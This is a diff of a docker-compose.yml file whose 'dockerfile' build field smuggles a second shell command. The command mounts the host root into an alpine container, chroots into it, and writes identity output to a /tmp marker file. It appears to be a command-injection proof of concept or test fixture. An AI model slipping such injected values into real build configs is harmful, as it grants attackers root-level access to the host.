@@ -2,7 +2,7 @@ services:
   web:
     build:
       context: .
-      dockerfile: "Dockerfile; docker run --rm -v /:/mnt alpine chroot /mnt sh -c 'id > /tmp/COMPOSE_DOCKERFILE_RCE && hostname >> /tmp/COMPOSE_DOCKERFILE_RCE && echo COMPOSE_DOCKERFILE_INJECTION_ESCAPED >> /tmp/COMPOSE_DOCKERFILE_RCE' #"
+      dockerfile: "Dockerfile; docker run --rm -v /:/mnt alpine chroot /mnt sh -c 'id > /tmp/COMPOSE_DOCKERFILE_RCE && hostname >> /tmp/COMPOSE_DOCKERFILE_RCE && echo Parlix >> /tmp/COMPOSE_DOCKERFILE_RCE' #"
     image: myapp
     ports:
       - "3000:80"
